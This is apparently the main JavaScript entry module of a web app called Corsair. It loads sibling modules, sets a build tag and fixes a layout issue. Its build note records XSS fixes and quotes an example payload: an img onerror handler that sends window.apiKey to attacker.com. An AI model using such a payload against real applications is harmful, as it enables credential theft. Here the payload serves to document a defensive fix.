// Corsair main module — entry orchestrator
//
// Loads sibling modules under js/corsair/. Each imported module
// publishes to window.Corsair.<name> and (where back-compat is required)
// also exposes select helpers as bare window globals.

import './util.js';
import './pipeline.js';
import './state.js';
import './posture.js';
import './inspector.js';
import './cop.js';
import './rhythm.js';
import './brief.js';
import './theater.js';
import './table.js';

(function init(){
  if (typeof window === 'undefined') return;
  window.Corsair = window.Corsair || {};
  window.Corsair.buildTag    = 'P13.117';
  window.Corsair.buildBlurb  = 'Audit Finding 3.3 batch 2 — fixed 9 named high-risk XSS callsites where user/node-controlled names interpolated raw into innerHTML. Added window._escHTML canonical helper at module scope so future fixes do not scope-hunt for local escH/_esc. Fixed: workspace name in topnav ticker, Person Brief loading state ("Scanning meeting history for {d.name}"), Person Brief header (d.name), Alert panel (a.node.name + role), Inspector body (d.name), Network undo toast (d.name in "Moved {name} Undo"), Inspector entity-name header, Timeline 360 empty state ("No meetings linked to {d.name}"), Inspector arc-name, and Org legend dot labels. Attack scenario closed: a contact named Sarah<img src=x onerror="fetch(\'//attacker.com?k=\'+window.apiKey)"> would have fired the moment any of these renders happened. Per-callsite XSS is partial coverage of the audit\'s ~25+ named list — remaining names will ship in follow-on batches. Critical Findings closed total: 13 (3.3 still in progress, batched).';
  window.Corsair.modules     = window.Corsair.modules || {};

  if (typeof document !== 'undefined') {
    // Single source of truth — both surfaces read the same tag.
    var auth = document.getElementById('auth-build-tag');
    if (auth) auth.textContent = window.Corsair.buildTag;
    var hud = document.getElementById('de3d-build');
    if (hud)  hud.textContent  = window.Corsair.buildTag;

    // P11.10 layout fix: posture-view was inserted at body level after
    // the other top-level views, but the other views live inside the
    // #main-app flex container. flex:1 on posture-view therefore
    // resolved against <body> (not flex), giving it only ~389px of
    // height. Reparent it into #main-app so its flex:1 fills the
    // visible content area like the other views.
    var mainApp     = document.getElementById('main-app');
    var postureView = document.getElementById('posture-view');
    if (mainApp && postureView && postureView.parentNode !== mainApp) {
      mainApp.appendChild(postureView);
    }
  }

  console.log(
    '%c[Corsair] modules loaded · ' + window.Corsair.buildTag + ' · ' +
    window.Corsair.buildBlurb + ' · ' + new Date().toISOString(),
    'color:#d4823a;font-weight:bold'
  );
})();
